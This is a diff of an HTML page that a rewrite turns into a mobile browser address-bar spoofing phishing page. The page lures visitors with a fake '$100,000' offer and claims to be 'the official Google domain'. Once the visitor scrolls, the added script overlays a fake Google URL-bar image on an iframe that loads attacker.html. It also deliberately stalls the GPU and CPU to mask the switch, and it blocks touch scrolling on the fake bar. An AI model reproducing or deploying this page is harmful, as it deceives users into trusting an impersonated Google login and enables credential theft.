@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
-    <title>testerter</title>
+    <title>azzzab</title>
     <style>
       body,
       html {
@@ -14,12 +14,11 @@
         padding: 0;
         width: 100%;
         height: 200vh;
-        background-color: #ffffff;
-        font-family: -apple-system, Roboto, sans-serif;
+        background-color: #f8f9fa;
+        font-family: sans-serif;
         scroll-behavior: smooth;
         overflow-x: hidden;
       }
-
       #scroll-bait {
         display: flex;
         flex-direction: column;
@@ -27,52 +26,9 @@
         justify-content: center;
         height: 100vh;
         text-align: center;
-        color: #3c4043;
-        padding: 30px;
-        box-sizing: border-box;
-      }
-
-      .icon-circle {
-        width: 64px;
-        height: 64px;
-        background: #f1f3f4;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin-bottom: 20px;
-      }
-
-      h2 {
-        font-weight: 400;
-        font-size: 22px;
-        margin-bottom: 10px;
-      }
-      p {
-        font-size: 14px;
-        line-height: 1.6;
         color: #5f6368;
+        padding: 20px;
       }
-
-      .arrow {
-        margin-top: 40px;
-        font-size: 24px;
-        animation: slideDown 1.5s infinite;
-      }
-      @keyframes slideDown {
-        0% {
-          transform: translateY(0);
-          opacity: 0;
-        }
-        50% {
-          opacity: 1;
-        }
-        100% {
-          transform: translateY(20px);
-          opacity: 0;
-        }
-      }
-
       #fake-ui {
         display: none;
         position: fixed;
@@ -80,10 +36,22 @@
         left: 0;
         width: 100vw;
         height: 100vh;
-        z-index: 9999;
+        z-index: 99999;
         background: #fff;
       }
-
+      #fake-bar {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 56px;
+        object-fit: contain;
+        border-bottom: 1px solid #ddd;
+        z-index: 10;
+        opacity: 0;
+        transition: opacity 0.1s ease-in;
+        pointer-events: none;
+      }
       #fake-content {
         position: absolute;
         top: 0;
@@ -91,143 +59,86 @@
         width: 100%;
         height: 100vh;
         border: none;
+        z-index: 1;
         display: block;
+        transition:
+          top 0.1s ease-in,
+          height 0.1s ease-in;
       }
-
-      #arc-click-catcher {
-        display: none;
-        position: absolute;
+      #gpu-killer {
+        position: fixed;
         top: 0;
         left: 0;
-        width: 100%;
-        height: 100vh;
-        z-index: 9999;
-        background: transparent;
-      }
-
-      #arc-wrapper {
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        width: 100%;
-        z-index: 10000;
-        display: flex;
-        flex-direction: column;
-        justify-content: flex-end;
+        width: 1px;
+        height: 1px;
         pointer-events: none;
-      }
-
-      #arc-expanded {
-        width: 100%;
-        object-fit: contain;
-        display: block;
-        transform: translateY(100%);
-        transition: transform 0.35s cubic-bezier(0.2, 0.8, 0.2, 1);
-        border-top-left-radius: 24px;
-        border-top-right-radius: 24px;
-        box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-        cursor: pointer;
-        pointer-events: auto;
-      }
-
-      #arc-collapsed-container {
-        position: absolute;
-        bottom: 0; 
-        left: 0;
-        width: 100%;
-        z-index: 10001;
-        transition:
-          opacity 0.2s ease,
-          transform 0.3s ease;
-        pointer-events: auto;
-        display: block;
-      }
-
-      #arc-collapsed {
-        width: 100%;
-        object-fit: contain;
-        display: block;
-        border-radius: 0;
-        background-color: transparent;
-      }
-
-      #up-arrow-hotspot {
-        position: absolute;
-        bottom: 12px;
-        right: 4%;
-        width: 60px;
-        height: 60px;
-        background: rgba(255, 0, 0, 0);
-        border-radius: 50%;
-        z-index: 10002;
-      }
-
-      #arc-wrapper.open #arc-expanded {
-        transform: translateY(0);
-      }
-
-      #arc-wrapper.open #arc-collapsed-container {
-        opacity: 0;
-        transform: translateY(30px);
-        pointer-events: none;
+        z-index: 1;
       }
     </style>
   </head>
   <body>
     <div id="scroll-bait">
-      <div class="icon-circle">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="#4285F4">
-          <path
-            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-2h2v2zm0-4h-2V7h2v6z"
-          />
-        </svg>
-      </div>
-      <h2>scroll down to get $100,000 from apple</h2>
+      <h2>
+        This is the official Google domain. Want to earn $100,000? Follow these
+        instructions. Please scroll down to the bottom of this page to proceed
+        to accounts.google.com.
+      </h2>
+      <div style="font-size: 50px; color: #1a73e8; margin-top: 30px">↓</div>
     </div>
-
+    <div id="gpu-killer"></div>
     <div id="fake-ui">
-      <iframe id="fake-content" src="atck.html"></iframe>
-
-      <div id="arc-click-catcher"></div>
-
-      <div id="arc-wrapper">
-        <img id="arc-expanded" src="bar2.PNG" alt="Arc Expanded Menu" />
-
-        <div id="arc-collapsed-container">
-          <img id="arc-collapsed" src="bar1.PNG" alt="Arc Collapsed Pill" />
-          <div id="up-arrow-hotspot"></div>
-        </div>
-      </div>
+      <img id="fake-bar" src="urlbar-googleE.jpg" alt="Google Address Bar" />
+      <iframe id="fake-content" src="attacker.html"></iframe>
     </div>
 
     <script>
-      let active = false;
+      let isSpoofed = false;
 
-      window.addEventListener("scroll", () => {
-        if (window.scrollY > 60 && !active) {
-          active = true;
-          document.getElementById("fake-ui").style.display = "block";
-          window.scrollTo(0, 0);
+      function triggerMeltdown() {
+        const killerContainer = document.getElementById("gpu-killer");
+        for (let i = 0; i < 2000; i++) {
+          let div = document.createElement("div");
+          div.style.cssText = `position:absolute; width:200vw; height:10vh; background:rgba(0,0,0,0.01); backdrop-filter:blur(10px) contrast(200%); transform:rotate(${Math.random() * 360}deg);`;
+          killerContainer.appendChild(div);
+        }
+        let start = Date.now();
+        while (Date.now() - start < 400) {}
+      }
+
+      window.addEventListener(
+        "scroll",
+        () => {
+          if (window.scrollY > 80 && !isSpoofed) {
+            isSpoofed = true;
+            document.getElementById("fake-ui").style.display = "block";
+            triggerMeltdown();
+            window.scrollTo(0, 0);
+            setTimeout(() => {
+              document.getElementById("gpu-killer").innerHTML = "";
+            }, 1000);
+          }
+        },
+        { passive: true },
+      );
+
+      window.addEventListener("message", (e) => {
+        if (e.data === "SNAP_TRAP") {
+          let fakeBar = document.getElementById("fake-bar");
+          let fakeContent = document.getElementById("fake-content");
+          fakeBar.style.opacity = "1";
+          fakeBar.style.pointerEvents = "auto";
+          fakeContent.style.top = "56px";
+          fakeContent.style.height = "calc(100vh - 56px)";
         }
       });
 
-      const arcWrapper = document.getElementById("arc-wrapper");
-      const hotspot = document.getElementById("up-arrow-hotspot");
-      const expandedBar = document.getElementById("arc-expanded");
-      const clickCatcher = document.getElementById("arc-click-catcher");
-
-      hotspot.addEventListener("click", () => {
-        arcWrapper.classList.add("open");
-        clickCatcher.style.display = "block";
-      });
-
-      function closeArc() {
-        arcWrapper.classList.remove("open");
-        clickCatcher.style.display = "none";
-      }
-
-      expandedBar.addEventListener("click", closeArc);
-      clickCatcher.addEventListener("click", closeArc);
+      document.getElementById("fake-bar").addEventListener(
+        "touchmove",
+        (e) => {
+          if (isSpoofed) e.preventDefault();
+        },
+        { passive: false },
+      );
     </script>
   </body>
 </html>
